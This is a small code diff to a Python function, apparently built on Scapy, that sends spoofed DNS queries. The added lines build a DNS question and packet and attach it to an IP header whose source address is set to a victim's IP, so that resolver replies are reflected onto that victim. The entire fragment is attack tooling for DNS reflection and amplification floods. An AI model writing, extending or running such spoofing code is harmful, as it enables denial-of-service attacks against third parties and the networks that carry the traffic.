@@ -39,5 +39,9 @@ def send_spoofed_dns_query(domain, resolver_ip, resolver_port, victim_ip,
                            dnssec_do=False, txid=0x1337, id_random=False,
                            verbose=False, measure=False, qclass=1):
     txid_val = _make_txid(txid, id_random)
+    qtype_int = QTYPE_MAP.get(qtype.upper(), 1)
+    question = DNSQR(qname=domain.strip('.'), qtype=qtype_int, qclass=qclass)
+    pkt_dns = DNS(id=txid_val, rd=1, qd=question)
     ip_layer = IP(src=victim_ip, dst=resolver_ip)
     udp_layer = UDP(sport=victim_src_port, dport=resolver_port)
+    pkt = ip_layer / udp_layer / pkt_dns
